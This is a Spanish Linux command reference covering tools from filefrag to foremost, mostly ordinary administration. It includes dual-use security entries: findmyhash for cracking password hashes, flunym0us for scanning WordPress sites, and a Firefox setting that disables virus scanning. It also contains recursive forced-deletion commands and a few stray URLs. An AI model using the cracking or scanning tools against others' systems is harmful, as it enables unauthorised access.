Visualizar la fragmentación de un fichero [ext2,3 y 4].
# filefrag -v fichero (Con resultado “1 extent found” no está fragmentado, en caso contrario, si)


fileschanged
Utilidad que informa cuando los archivos han sido alterados. Cuando descubre que un archivo ha sido alterado, muestra el nombre del archivo en la salida estándar.
$ fileschanged -r ~/ (controla el directorio home del usuario de forma recursiva)
$ fileschanged /var/log/messages


filetraq
Script de shell que informa sobre alguna modificación en algún archivo que se ha producido. Está diseñado para ejecutarse como un trabajo cron, además mantiene una copia de seguridad con fecha del original.
# filetraq


filters
Colección de filtros para hacer todo tipo de cosas extrañas a un texto en inglés. Opciones: (LOLCAT, b1ff, censor, chef, cockney, eleet, fanboy, fudd, jethro, jibberish, jive, ken, kenny, kraut, ky00te, nethackify, newspeak, nyc, pirate, rasterman, scottish, scramble, spammer, studly, uniencode y upside-down)
$ echo "make tech easier is cool" | pirate
$ echo "make tech easier is cool" | ky00te
$ echo "make tech easier is cool" | kraut
$ echo "make tech easier is cool" | kenny


fim
Herramienta que utiliza el framebuffer del sistema para mostrar imágenes directamente desde la línea de comandos.
$ fim imagen.jpg (uso básico)
$ fim -a *.jpg (abrir todas las imagenes jpg del directorio actual con zoom automático)
$ fim -R Imagenes/ --sort (Para abrir las imagenes de la carpeta y subcarpetas recursivamente y despues ordenarlas)
$ fim -t imagen.jpg (randerizar una imagen en formato ASCII)
Atajos de teclado
    AvPág/AvPág		Prev/Imagen siguiente.
    +/-			Acercar/Alejar la imagen.
    a			Autoescalar
    w			Ajustar al ancho.
    h			Ajustar a la altura.
    j/k			Desplegar/subir.
    f/m			Voltear/espejo.
    r/R			Girar (en sentido del reloj y en sentido contrario)
    q			Salir


finch
Cliente de mensajería instantánea en ncurses. La primera vez que se ejecute  mostrará la ventana de “Cuentas”, desde donde se configuran las distintas cuentas para conectarse.
Algunos atajos de teclado:
	Alt + a (menú)
	^ + q (Cerrar aplicación)
	Alt + n (Ir a la ventana siguiente)
	Alt + p (Ir a la ventana anterior)O
	Alt + c (Cerrar la ventana actual)
	Alt + r (Redimensionar la ventana con las teclas del cursor)
	Alt + o (Abrir menú de ventana)
	Alt+num (cambiar a la ventana indicada)
	tab (navegar por las distintas opciones)
	espacio (Marcar/desmarcar opciones)
	enter (Seleccionar opción)
	esc (Salir de opciones)



fincore
Cuenta páginas del contenido de los archivos y número de bytes. Si se produce un error durante el conteo, se imprime un mensaje de error en pantalla y fincore continúa procesando el resto de archivos listados en una línea de comandos.
$ fincore -b text1.txt text2.html


find
Buscar archivos o directorios
$ find / -iname archivo     (Busca en / archivo sin distinguir minusculas y mayusculas)
$ find /home -name *.png -print      (Buscará en /home todos los archivos “.png” y mostrará la ruta)
$ find . -name "*.bak" -exec rm {} \; (buscará en el directorio todos los acabados en .bak y los borrará. la instrucción "-exec" seguido del comando a ejecutar. los corchetes {} se refiere a los ficheros que find ha encontrado y la barra invertida seguido de punto y coma \; indica el final de la instrucción)
$ find . ! -iname “*.png” ! -name “*.jpg”  (Buscar en el directorio actual todos los archivos menos los acabados en png y jpg)
$ find . -type f -iname '*.txt' -o -iname '*.pdf' (buscar en el directorio actual y subdirectorios todos los .txt y los .pdf)
$ find . -amin -15 (Buscar los que se ha accedido en los últimos 15 minutos)
$ find . -atime 15 (Buscar los que se accedió por última vez hace 15 dias)
$ find / -amin -10 (Los que se ha accedido los últimos 10 minutos)
$ find . -type f  (Buscar ficheros)
$ find . -type d  (Buscar directorios)
$ find / -iname fichero 2>/dev/null  (buscar redireccionando los avisos de permiso denegado a /dev/null)
$ find . -iname "*.txt" -or -iname "*.odt" -exec cp {} documentos \; (Buscar los txt y los odt y copiarlos a la carpeta documentos)
$ find . -type d -exec chmod 0755 {} \; (Cambiar permisos de todos los directorios y subdirectorios)
$ find . -type f -exec chmod 0644 {} \; (Cambiar permisos de todos los ficheros del directorio y de los subdirectorios)
$ find . -type f -iname "*.bak" | xargs rm (buscar los ficheros acabados en .bak y borrarlos. xargs hace lo mismo que exec pero usando una tuberia.)
$ find /home/usuario -name * | xargs grep "tractatus" (buscar cadena de caracteres "tractatus" dentro de todos los archivos de /home/usuario)
$ find /home/usuario -iname '*.bak' -delete (Otra forma de borrar todos los .bak de un directorio)
$ find . -type f -iname *.sla (buscará los ficheros .sla)
$ find . -type f -mtime 0 (Buscará los ficheros creados o modificados hoy)
$ find / -type f -mtime -1 -print (Los modificados las últimas 24 horas)
$ find / -mtime +2 -print (Los modificados hace más de dos dias)
$ find -L . -type l  (Buscar enlaces rotos)
$ find -name "#*#" -print -delete (suprimir todos los que empiecen por *)
$ find -name "*~undo-tree~" -print -delete (en emacs todos los bufers que han dejado rastros *undo-tree*)
$ find . –type l (lo mismo)
$ find . -type l -delete (eliminat todos los enlaces rotos)
$ find . -type f -size +300k > masde300k.txt (buscar .sh mayores de 300k)
$ find ./ -name .svn -exec rm -rf {} \; (eliminar todos los directorios y subdirectorios subversión)
$ find . -name "*.html" -exec grep -i -H "Tractatus elementalis" {} \; (Buscar en todos los archivos html del directorio actual con un texto concreto)
$ find . -name \*.txt -exec sed -i "s/cosa/casa/g" {} \; (Substituir “cosa” por “casa” en todos los .txt del presente directorio)
$ find ~/ -depth -type f -empty (Buscar archivos vacios. Con -type d buscará directorios vacios)
$ find / -name "algo" -a ! -path "/media/servidor/*" -exec echo {} \; 2>/dev/null (Buscar "algo" descartando el directorio /media/servidor/)
$ find /home/usuario -iname '*.odt' -exec cp '{}' /home/usuario/Documentos \; (Copiar todos los odt a la carpeta Documentos)
$ find . -type f -amin -5 ! -path "./.*" (Buscar ficheros modificados los últimos 5 minutos descartando los ocultos)
$ find . ! -name "plantilla*" -type f -delete | find . ! -name HTMLS -type d -delete (borrar todos menos los "plantilla*" y el directorio "HTMLS")
$ find -L /sys/bus/pci/devices/*/ata*/host*/target* -maxdepth 3 -name "sd*" 2>/dev/null | egrep block |egrep --colour '(ata[0-9]*)|(sd.*)' (Encontrar qué /dev/sda, sdb, etc. corresponde al ATA/SATA declarado en dmesg, etc para determinar qué disco duro es)


finddup
[perforate]. Encuentra archivos idénticos
$ finddup -n -i (comprueba el directorio actual y solo imprime la salida y no comprueba que el propietario del archivo y los permisos coincidan)
$ finddup -v -i -l -d DIR (máxima información, sin comprobar permisos y vinculando archivos idénticos del directorio mencionado)


findfs
Busca el sistema de ficheros por su etiqueta (LABEL) o UUID.
$ findfs UUID=388dda65-2432-4684-8cd9-b1649006fe30
$ findfs LABEL=datos


findmnt
Muestra una lista de sistemas de archivos montados.
$ findmnt -A (En forma de arbol)
$ findmnt -s (en /etc/fstab)
$ findmnt -s -t ext4 (Especificando una extensión concreta)
$ findmnt -m (en /etc/mtab)
$ findmnt -l (Los muestra como lista)


findmyhash
Busca hashes de contraseñas en diferentes servicios web gratuitos para tratar de romperlos. Descarga <https://code.google.com/p/findmyhash/downloads/list>
$ python findmyhash.py MD5 -h "098f6bcd4621d373cade4e832627b4f6"
$ python findmyhash.py SHA224 -h "e98da241a4504c5e52f0ef06f87a7598e7db22e1579326441fe7aa50"


findsmb
Busca máquinas en la red que respondan al protocolo samba.
$ findsmb -r


fing
Escaner de la conexión wiki. Página de descarga http://www.overlooksoft.com/
# fing


finger
Quien está conectado al sistema, tiempo, consola...
$ finger -s
$ finger -l


finit
Alternativa a SysV init y systemd.
# finit 0 (cerrar el sistema. Equivalente a "init 0")
# finit 6 (reiniciar el sistema. Equivalente a "init 6")
# finit 1 (entrar en modo recuperar sistema)
# finit q (releer la configuración si se ha modificado)


firebuild
Funciona almacenando en caché las salidas de los comandos ejecutados y reproduciendo los resultados cuando los mismos comandos se ejecutan con los mismos parámetros dentro del mismo entorno.
# firebuild -r htop (genera un informe con nombre firebuild-build-report.html sobre el comando htop)


firefox
Navegador.
$ firefox --private (Nota.- Son dos guiones. Arrancar en modo privado. Para incluir por defecto este modo en la propiedades: firefox --private %U)
$ firefox 'data:text/html, texto que queremos mostrar' (Visualizar un texto en una ventana del navegador)
$ MOZ_ALLOW_DOWNGRADE=1 firefox -P (En caso de desactualizar firefox necesitaremos pasar el MOZ_ALLOW_DOWNGRADE=1 para poder usar el perfil de usuario que teníamos. Con el -P seleccionamos qué perfil queremos, saldrá una ventanita. Testeado con versión 89.0.1 hacia 88.0)
Cambios para optimizar las conexiones y para aprovechar otros parámetros. Escribir en la barra de direcciones: "about:config" y pulsar enter. Cambiar los siguientes valores. Para ello, hacer doble click encima de la línea a modificar y en el cuadro de diálogo que aparece, escribir el valor nuevo:
Ajustes generales [dependen de la versión instalada]:
network.dns.disableIPv6 true
network.http.max-connections 128
network.http.max-connections-per-server 48
network.http.max-persistent-connections-per-proxy 24
network.http.max-persistent-connections-per-server 12
network.http.pipelining true
network.http.proxy.pipelining true
network.http.pipelining.maxrequests 30
browser.sessionstore.interval 300000
Activar protección contra el tracking:
	privacy.trackingprotection.enabled	true
Desactivar escaneo de virus.
	browser.download.manager.scanWhenDone false
Guarda pestañas abiertas al cerrar:
	browser.showquitwarning true
Deshabilitar la opción de recuperación de sesión.
	browser.sessionstore.enabled false
Si tenemos problemas con hotmail, suprimir el nombre de la distro:
	general.useragent.vendor
Instalar extensiones incompatibles (peligroso):
	extensions.checkCompatibility  False
Si no queremos que pregunte por guardar contraseñas:
	signon.RememberSignons false
Activar tecla backspace para ir a la página anterior
	browser.backspace_action 0
Visualizar todas las pestañas:
	browser.allTabs.previews true
Cambiar idioma:
	general.useragent.locale
Deshabilitar o aumentar la cantidad de sugerencias de la barra de direcciones (por defecto 12. Dehabilitar -1).
	browser.urlbar.maxRichResults  15
Modificar el intervalo de tiempo de recuperación de sesión (1 segundo=1000. Por defecto cada 10 segundos) El parámetro anterior tiene que estar en "true".
	browser.sessionstore.interval 20000
Mejorar la calidad de color (consume muchos recursos).
	gfx.color_management.enabled true
Suprimir el scroll de pestañas aunque tengamos muchas abiertas (por defecto 100).
	browser.tabs.tabMinWidth 0
Abrir las ventanas emergentes en una nueva pestaña (por defecto lo abre como ventana [2]. Para no abrir ninguno [1])
	browser.link.open_newwindow.restriction 0
Habilitar diccionario para todos los campos de texto (por defecto solo multilinea [1]. Deshabilitar [0]).
	layout.spellcheckDefault 2
Abrir resultados de búsqueda en otra pestaña.
	browser.search.openintab true
Modificar la caché (por defecto 50000 kb)
	browser.cache.disk.enable true.
	browser.cache.disk.capacity 100000
Habilitar sugerencias de autocompletado en la barra de direcciones.
	browser.urlbar.autofill  true
Auto exportar Favoritos para sincronización con otro navegador
	browser.bookmarks.autoExportHTML true
Aumentar el historial de "deshacer cerrar pestaña". (por defecto 10)
	browser.sessionstore.max_tabs_undo 20
Deshabilitar tiempo de espera al agregar complementos (por defecto 5 segundos)
	security.dialog_enable_delay 0
Ver código fuente con el editor favorito.
	view_source.editor.external true
	view_source.editor.path /ruta/al/editor
Mostrar siempre [incluso en modo "pantalla completa"] la barra superior.
	browser.fullscreen.autohide false
Aumentar lista de búsqueda de complementos (por defecto 5).
	extensions.getAddons.maxResults 10
Evitar que un sitio modifique el tamaño de ventanas.
	dom.disable_window_move_resize true
Mostrar las pestañas abiertas como miniaturas. Crea un botón que muestra una vista previa de pestañas abiertas.
	browser.allTabs.previews  true
No mostrar favicon en la barra de direcciones y en las pestañas.
	browser.chrome.site_icons  False
Evitar cuelgues al abrir muchas pestañas (por defecto 256)
	network.http.max-connections 48
Desactivar sitios más visitados en nueva página:
	browser.newtabpage.enabled  false
Al abrir nueva pestaña que se abra con un URL concreta:
	browser.newtab.url
Que las preferencias se abran en nueva pestaña y no en nueva ventana:
	browser.preferences.InContent true
Habilitar lector nativo de pdf en javascript:
	pdfjs.disable false
Habilitar dominios multilingües [idn] -Que continenen caracteres raros.
	network.enableIDN true
Ver listado de todos los idn habilitados [todos en true]:
	network.IDN.whitelist
Habilitar lector de pdfs:
	pdfjs.disabled true
Habilitar soporte para H.264, AAC y mp3:
	media.gstreamer.enabled true
Rechazar cookies automaticamente:
        cookiebanners.service.mode 2
        cookiebanners.service.mode.privateBrowsing 2
Acceso a los diálogos de firefox:
	chrome://browser/content/bookmarks/bookmarksPanel.xul  (las direcciones de interés)
	chrome://browser/content/history/history-panel.xul  (historial)
	chrome://global/content/console.xul (Consola Javascript)
	chrome://passwordmgr/content/passwordManager.xul (Administrador de contraseñas)
	chrome://pippki/content/getpassword.xul (Establecer contraseña maestra)
	chrome://pippki/content/resetpassword.xul (Restablecer contraseña maestra)
	chrome://mozapps/content/downloads/downloads.xul (lista de descargas efectuadas)
	chrome://browser/content/browser.xul (abre un navegador completo en una pestaña)
	chrome://browser/content/preferences/preferences.xul (Abre las preferencias)
Archivos de interés en los perfiles de firefox (.mozilla/firefox/*.default):
	bookmarks.html - Nuestros marcadores
	cert8.db - Certificados de seguridad
	formhistory.dat - Formularios memorizados
	key3.db - Contraseñas almacenadas
"about:" (escrito en la barra de direcciones de firefox):
	about:  (Información sobre el navegador)
	about:blank  (Una página en blanco)
	about:buildconfig  (Detalles de la compilación para nuestra versión)
	about:cache  (información sobre la cache del navegador)
	about:cache?device=memory  (Muestra la caché en memoria)
	about:cache?device=disk  (Muestra la caché de disco)
	about:config  (Configuración del navegador)
	about:credits  (Lista de los que contribuyeron al desarrollo del navegador)
	about:logo  (El logo del navegador)
	about:mozilla  (Muestra un pasaje de “El Libro de Mozilla”)
	about:plugins  (lista detallada de los plugins que tenemos instalados)
$ grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '"""' | cut -f3 -d'"' | sort -u  (listar las extensiones de firefox)
$ firefox -ProfileManager -no-remote (crear un perfil sin cerrar firefox)
$ firefox http://www.google.com/search?q=BUSQUEDA (buscar algo por linea de comandos [abre el navegador])
$ firefox http://images.google.com/images?q=BUSQUEDA (Lo mismo para imágenes)
$ firefox http:/books.google.es/search?q=BUSQUEDA (lo mismo con libros)
$ firefox http://news.google.es/news/search?q=BUSQUEDA (Con noticias)
$ find ~/.mozilla -iname '*.sqlite' -execdir sqlite3 {} 'vacuum;' \; (desfragmentar la base de datos de firefox. Tambien existe plugin[SQLite Manager])
1.-
Mandar un email desde la barra de direcciones (Valido tambien para chromium):
Tener configurado un gestor de correos [evolution, thunderbird..]. Escribir en la abarra de direcciones:
	mailto:usuario@gmail.com
Del destinatario. Se abrira el gestor de correo listo para escribir.
Atajos:
Navegación:
	Alt + <- (Ir a la página anterior)
	Atl + -> (Ir a la página siguiente)
	Alt + inicio (Inicio)
	^ + o (Abrir archivo)
	F5 (Recargar)
	^+ F5 (Recargar reemplazando caché)
	Esc (Detener)
Página actual:
	Fin (Ir al final de la página)
	Inicio (Ir a principio de la página) date
	F6 (Ir a la siguiente pestaña)
	Mayús + F6 (Ir a la anterior pestaña)
	^+ p (Imprimir)
	^+ s (Guardar página como...)
	^+ + (Aumentar tamaño texto)
	^+ - (Reducir tamaño texto)
	^+ 0 (Restablecer tamaño texto)
Editar:
	^+ c (Copiar)
	^+ x (Cortar)
	Supr (Eliminar)
	^+ v (Pegar)
	^ + Z (Rehacer)
	^+ a (Seleccionar todo)
	^+ z (Deshacer)
Buscar:
	^ +f (Encontrar)
	F3 (Encontrar de nuevo)
	Mayús * F3 (Encontrar anterior)
	' (Búsqueda texto de enlaces)
	/ (Búsqueda rápida)
	Esc (Cerrar busquedas)
	^+ k (Barra de búsqueda)
	Alt + flecha arriba/abajo , con el foco en la barra (Seleccionar motor busqueda)
Ventanas y pestañas:
	^ + w (Cerrar pestaña)
	Alt + F4 (Cerrar ventana)
	^ + <- (Mover pestaña a la izq.)
	^+ -> (Mover pestaña a la dere.)
	^+ home (Mover pestaña al comienzo)
	^+ fin (Mover pestaña al final)
	^+ t (Nueva pestaña)
	^+ n (Nueva ventana)
	Alt + intro desde la barra direcciones o bus1uedas (Abrir en nueva pestaña)
	^+ tab (Pestaña siguiente)
	^+ Mayús + tab (Pestaña anterior)
	^+ Mayús + t (Deshacer cerrar pestaña)
	^+ Mayús + n (Deshacer cerrar ventana)
	^+ 1 ....8 (Seleccionar pestaña 1 a 8)
	^+ 9 (Seleccionar última pestaña)
	^+ Mayús + e (Vista grupos de pestañas)
	Esc (Cerrar vista de grupos pestañas)
Historial:
	^+ h (Panel lateral de Historial)
	^+ H (Historial)
Marcadores:
	^ + D (Agregar pestañas a marcadores)
	^+ d (Agregar página a marcadores)
	^+ b (Panel lateral de marcadores)
	^+ O (Marcadores)
Herramientas: http://www.overlooksoft.com/
	^+ Y (Descargas)
	^+ A (Complementos)
	^+ K (Consola web)
	^+ I (Inspeccionar)
	Mayús + F4 (Borrador)
	^+ u (Código fuente de la página)
	^+ J (Consola de errores)
	^+ i (Información de la página)
	^+ P (Navegación privada)
	^+ S (Limpiar historial) http://www.overlooksoft.com/
Otros atajos:
	^+ intro (Completar dirección .com)
	Mayús + intro (Completar dirección .net)
	^+ Mayús + intro (Completar dirección .org)
	Alt (Ver barra de menús en kde)
	F10 (Ver barra de menús en gnome)
	^+ / (Mostrar/Ocultar complementos)
	F7 (Navegación con cursor)
	F11 (Pantalla completa)
	^+ l (Barra de direcciones)


firehol
Genera firewalls genéricos basados en iptables. El archivo de configuración se encuentra en /etc/firehol/firehol.conf. Primero activar la configuración básica:
       START_FIREHOL=YES
       WAIT_FOR_IFACE="enp1s0" (la interfaz de red [eth0, wlan0 ...)
       FIREHOL_ESTABLISHED_ACTIVATION_ACCEPT=1 (permitir tráfico preestablecido mientras el firewall esté activado)
Otras opciones:
	0 (No permitir que el tráfico preestablecido continúe mientras el firewall esté activado)
        "optimal" (óptimo)
	"accurate" (preciso)
# firehol helpme > /tmp/firehol.conf (crea una configuración adaptada a nuestro pc y la guarda en un archivo)
# firehol try /tmp/firehol.conf (después de parar la aplicación [firehol stop] probar la configuración anterior y si nos satisface, copiarla en /etc/firehol/firehol.conf)
# firehol start (tambien se tiene que arrancar)
# firehol stop  (parar servicio)
# firehol status (estado de las conexiones)
# firehol cstatus (estado de las conexiones de forma interactiva)
# firehol panic (bloquear toda la comunicación IP)
# firehol restore (volver al estado normal de la aplicación)
# firehol restart (reiniciar despues de un cambio en la configuración)
# firehol explain (ingresar al modo interactivo y probar directivas. También proporciona los comandos de iptables para cada directiva junto con el razonamiento. No modifica ningún archivo de configuración)
  FireHOL [:] >
Después de entrar en modo interactivo con la aplicación, podemos probar entrando algunos conceptos:
  FireHOL [:] > interface eth0 world
  FireHOL [interface:world] > server smtp accept
  FireHOL [interface:world] > server ssh accept
  FireHOL [interface:world] > client http accept
  FireHOL [interface:world] > quit
Si alguno nos interesa podemos entrarlo en el archivo de configuración /etc/firehol/firehol.conf
1.- Muestra de un archivo de configuración
# nano /etc/firehol/firehol.conf
...
# Acepta todo el trafico entrante
interface any world
# Rechazar todos los paquetes entrantes
policy drop
# Todas las politicas de proteccion activas.
protection all
# Politicas de servicios que ofrecemos [web y torrents]
#server "http https" accept
#server p2p accept
# Todo el trafico saliente aceptado
client all accept


firejail
[firetools]. Programa que reduce el riesgo de violaciones de seguridad restringiendo el entorno de ejecución de aplicaciones no confiables encerrandolas en "jaulas" [sanbox] aisladas del sistema operativo, esto incluye al proceso y todos sus descendientes.
$ firejail transmission-gtk
# firejail /etc/init.d/nginx start
$ firejail --private --dns=8.8.8.8 --dns=8.8.4.4 firefox -no-remote
$ firejail --net=eth0 firefox
$ firejail --net=eth0 --ip=192.168.1.207 firefox
$ firejail firefox&
$ firejail vlc
$ firejail --net=none vlc (ejecutar vlc sin que tenga acceso a internet)
$ firejail --list (lista de programas que se estan ejecutando en el sandbox)
$ firejail --top (monitorizar el consumo de recursos de los programas del sandbox)
Nota.- el ampersand [&] permite cerrar la terminal y que el programa se siga ejecutando
La totalidad de perfiles disponibles se muestra en:
	$ ls /etc/firejail/


firewalld
es un demonio de firewall administrado dinámicamente con soporte para zonas de red/firewall para definir el nivel de confianza de las conexiones o interfaces de red. De modo predeterminado Firewalld tiene diferentes tipos de zonas. Cada una tiene un distinto nivel de seguridad: Para redes públicas: drop, block y public [predeterminada], redes externas: external, redes para hogar: work, home y internal y trusted en que todas las conexiones son aceptadas. En la mayoria se descartan los paquetes entrantes no solicitados y el resto son rechazados. Los registros en /var/log/firewalld.
# systemctl enable firewalld (iniciar firewalld automaaticamente al inicio del sistema)
# firewall-cmd --state (comprobar si esta activo. Más información: systemctl status firewalld)
# firewall-cmd --check-config (si el archivo de configuración tiene errores)
# firewall-cmd --set-log-denied=all (registrar todos los paquetes descartados [unicast, broadcast, multicast])
# firewall-cmd --get-log-denied (imprimir el registro de valores denegados)
# firewall-cmd --list-all (visión completa de la configuración de firewalld)
# firewall-cmd --list-all --zone=home (de una zona concreta)
# firewall-cmd --add-service=ssh --timeout 15m (incluir ssh durante 15 minutos al firewall)
# firewall-cmd --permanent --get-zones
# firewall-cmd --reload (releer configuración después de algún cambio)
# firewall-cmd --panic-on (desactivar inmediatamente el trafico de red)
# firewall-cmd --panic-off (volver a activarlo)
# firewall-cmd --query-panic (comprobar si está activado o no el modo panic)
# firewall-cmd --query-lockdown (consultar si el bloqueo está habilitado)
# firewall-cmd --lockdown-on (desbloquear bloqueo del firewall. Solo las aplicaciones en la lista blanca puedan solicitar cambios)
# firewall-cmd --lockdown-off (habilitar el bloqueo)
# firewall-cmd --list-services (servicios no permitidos)
# firewall-cmd --get-services (numerar todos los servicios predefinidos)
# firewall-cmd --add-service=samba (añadir un servicio a los permitidos)
# firewall-cmd --runtime-to-permanent (que la nueva configuración sea permanente)
# firewall-cmd --list-ports (listar los puertos permitidos)
# firewall-cmd --add-port=22/tcp (añadir un puerto y tipo a los permitidos)
# firewall-cmd --remove-port=22/tcp (cerrar un puerto)
# firewall-cmd --list-all-zones (información detallada de todas las zonas)
# firewall-cmd --zone=public --list-all (información detallada de una zona concreta)
# firewall-cmd --get-default-zone (verificar qué zona es la utilizada por el firewalld)
# firewall-cmd --get-active-zone (ver los interfaces asociados a cada zona)
# firewall-cmd --add-lockdown-whitelist-user=USER (añadir USER a la lista blanca)
# firewall-cmd --remove-lockdown-whitelist-user=USER (suprimir USER de la lista blanca)
# firewall-cmd --query-lockdown-whitelist-user=USER (consultar si USER esta en la lista blanca)
# firewall-cmd --list-lockdown-whitelist-users (consultar listado de usuarios de la lista blanca)
# dmesg | grep -i REJECT (ver los paquetes rechazados)


firewall-tests
Test completo del sistema sobre el firewall [ver].
# /usr/share/firewalld/testsuite/testsuite


fish
Intérprete de comandos.
$ fish (entra en la shell)
  pep@Deb ~> help (abre las instrucciones sobre fish en el navegador por defecto)
  help: Help is being displayed in xdg-open.
  pep@Deb ~> exit (salir de fish)


fixfiles
[selinux]. Este script se utiliza principalmente para corregir la base de datos del contexto de seguridad en los sistemas de archivos. También se puede ejecutar en cualquier momento para reetiquetar cuando se agregue soporte para una nueva política, o simplemente para comprobar si los contextos de los archivos son los esperados.  Por defecto reetiquetará todos los sistemas de ficheros ext2, ext3, xfs y jfs montados, siempre y cuando no tengan una opción de montaje en el contexto de seguridad. El fichero /etc/selinux/fixfiles_exclude_dirs puede contener una lista de directorios excluidos del reetiquetado. De manera más general, los programas iniciados por scripts init pueden no funcionar correctamente. Este problema se debe generalmente al etiquetado incorrecto de uno o más scripts de init. Puede reetiquetar los scripts emitiendo el comando fixfiles.
$ fixfiles restore


fixparts
[gdisk]. Repara ciertos tipos de problemas con la partición Master Boot Record (MBR). Puede eliminar datos de la tabla de particiones GUID (GPT), que se pueden dejar en un disco que alguna vez se usó como disco GPT, puede reparar particiones extendidas de tamaño incorrecto, ya sea particiones que se extiendan más allá del extremo físico del disco o que se superpongan con particiones primarias cercanas y tambien puede cambiar las particiones primarias en particiones lógicas o viceversa.
# fixparts /dev/sda


fkill
Matar procesos de forma interactiva. Descarga <https://github.com/sindresorhus/fkill-cli>
$ fkill
Una vez mostrada la salida, empezar a teclear el nombre de la aplicación y cuando aparezca, al pulsar intro se cerrará.
Otras formas de uso:
$ fkill 54377 (por el pid del proceso)
$ fkill chromium (por nombre directamente de la aplicación a cerrar)
$ fkill :5050 (por numero de puerto)


flatpak
Instalar, obtener, administrar y ejecutar paquetes de aplicaciones, alojadas en flathub, lugar central de aplicaciones linux. Para habilitar flathub lanzar en una terminal:
# flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
Reiniciar el sistema y ya podran usarse los argumentos especificos que procedan.
$ flatpak update (actualizar las aplicaciones)
$ faltpak list (listar aplicaciones instaladas)
$ flatpak history (mostrar historial)
$ flatpak config (lenguajes configurados)
$ flatpak repair (reparar la instalación de flatpak)
$ flatpak info (mostrar información de una aplicacion instalada)
$ faltpak uninstall paquete (desinstalar una aplicacion)
$ flatpak search paquete (buscar apliaciones)
$ flatpak kill aplicacion (detener una aplicación flatpak en ejecución)
$ flatpak ps (ver las aplicaiones faltpak ejecutándose)
$ flatpak run aplicacion (ejecutar una aplicación flatpak)


flexget
[python2.6 python-pip]. Descarga de series a partir de su direccion RSS. Archivo de configuración:
$ nano .flexget/config.yml
Con un contenido parecido a:
	presets:
	  tv:
	    series:
	      settings:
		hdtv:
		  timeframe: 8 hours
	      hdtv <720p:
		- serie 1
		- serie 2
		- serie 3
		- etc
	    content_filter:
	      require:
		- '*.avi'
	    download: "/media/discoext/Descargas/Torrents"
	tasks:
	  TvTorrent1:
	    rss: http://showrss.karmorra.info/feeds/all.rss
	    preset: tv
$ flexget --test (Comprobar si la configuración es correcta)
$ flexget (Lanzar la aplicación)


flunym0us
Pruebas de vulnarabilidad de webs basadas en wordpress. Descarga http://code.google.com/p/flunym0us/downloads/list
$ flunym0us -H http://host -w /home/usuario/wordlist -wp -t 60 -r 1 -p 2 -T 2
Opciones:
	-wp (Scanear un sitio wordpress)
	-mo (scanear un sitio Moodle)
	-H http://host (Nombre del host wordpress a scanear)
	-w /home/usuario/wordlist (Ruta al diccionario)
	-t 60 (Tiempo de espera)
	-r 1 (Reintentos de conexión)
	-p 2 (Numero de procesos)
	-T 2 (Número de subprocesos simultaneos por proceso)


fluxbox-generate_menu
Generador de menús de fluxbox.
$ fluxbox-generate_menu -g (Añade un menú tipo gnome)
$ fluxbox-generate_menu -k -o ~/.fluxbox/menu1 (Añade menú tipo kde y lo coloca en menu1 para probarlo. Sin especificar, substituiría el .fluxbox/menu)


flvstreamer
Descarga de videos con protocolo RTMP.
Supongamos que el video a descargar tenga por ruta: http://www.tv3.cat/videos/1307049732092
Abrir una pestaña del vavegador y pegar:
http://www.tv3.cat/su/tvc/tvcConditionalAccess.jsp?ID=1307049732092&QUALITY=H&FORMAT=MP4
Colocando en el número “ID=” el que corresponda y con la ruta rtmp que nos indique lanzar [en una sola linea]:
$ flvstreamer -r rtmp://mp4-500-str.tv3.cat/ondemand/mp4:g/tvcatalunya/2/9/1307049732092.mp4 -o video.mp4


fmt
Eliminar saltos de linea de un archivo y uniendo párrafos.
$ fmt -w 80 fichero.txt (limitando el número de caracteres por linea)
$ fmt -s 10 fichero.txt (solo une las lineas inferiores a 10 caracteres)


fnotifystat
Programa que vuelca la actividad del sistema de archivos en un período de tiempo determinado. Se puede utilizar para identificar la actividad de determinados archivos y descubrir qué procesos están realizando operaciones de apertura, cierre, lectura y escritura en los archivos.
# fnotifystat -D -T (ordenar estadisticas por dispositivo único y mostrando la fecha)
# fnotifystat -p 16755 (solo muestra archivos tocados por el proceso pid mencionado)
# fnotifystat -c -i /proc (volcar totales acumulados y especificar evento)
# fnotifystat -n -i /sys,/proc (especificando 2 procesos y sin estadísticas)
Algunas opciones:
	-d (quitar la ruta completa del directorio de los nombres de archivo)
	-h (muestra ayuda)
	-l (estadísticas por dispositivo único e inodo)
	-P (ordenar las estadísticas por pid, totales y nombre de archivo)
	-s (deshabilita la escala de los conteos de archivos)
	-t (solo muestra los archivos más activos)
	-v (modo detallado)


fnt
Buscar, obtener vista previa y descargar más de 1800 fuentes de los repositorios de fuentes web de Debian y Google.
$ fnt update (actualizar el listado)
$ fnt list (listar)
$ fnt search comic (buscar las "comic")
$ fnt preview agave (visualizar "agave)
# fnt install agave (instalar una concreta)


fntsample
Generador de ejemplos de fuentes que permite visualizar si determinada letra incluye el tipo de grafía que requiere nuestro locale (acento, geminada...)
$ fntsample -f .fonts/3Dumb.ttf -o 3Dumb.pdf (Especificando la fuente y el archivo para la salida)
$ fntsample -f ../.fonts/Hack-Regular.ttf -d ../.fonts/Hack-Italic.ttf -o diferencias_italic_regular.pdf (ver diferencias entre dos fuentes)


fold
Formatea la salida de un archivo a una determinada longitud.
$ fold archivo (a 80 caracteres por linea. Por defecto)
$ fold  -w 100 -s archivo (100 caracteres por linea y que corte por los espacios entre palabras y no por las palabras)


fonts-roadgeek
Conjunto de fuentes que replica los tipos de letra utilizados en las señales de carretera en varios países.


for
(ucle)]. Ejecuta un trozo de códico si la expresión de control es verdadera y sólo se para cuando es falsa.
Ejemplos:
1.-
 	#!/bin/bash
        for i in $( ls ); do
            echo item --> $i
        done
2.-
	#!/bin/bash
	for i in `seq 1 10`;
	do
		echo $i
	done
Nota.- Si los números los quisieramos en una misma linea, encerrar la variable entre comillas ["`seq 1 10`"]
3.-
	#!/bin/bash
	for i in 1 2 3 4 5
	do
	   echo "Es el número $i "
	done
4.-
	#!/bin/bash
	for i in {1..5}
	do
	   echo "Es el número $i "
	done
5.-
Del 1 al 10 de 2 en 2:
	#!/bin/bash
	for i in {1..10..2}
	do
		echo "Es el número $i "
	done
6.-
	#!/bin/bash
	# eliminar todos los archivos que no sean .txt
	for a in `ls | grep -v txt`
	do
		rm -fr $a
	done


foremost
Recuperación de datos
# foremost -i /dev/sda -o /recovery
# foremost -t jpg -i /dev/sda3 -o /home/usr/recuperado (Recuperar jdatepgs de una partición)
proceso sobre una imagen:
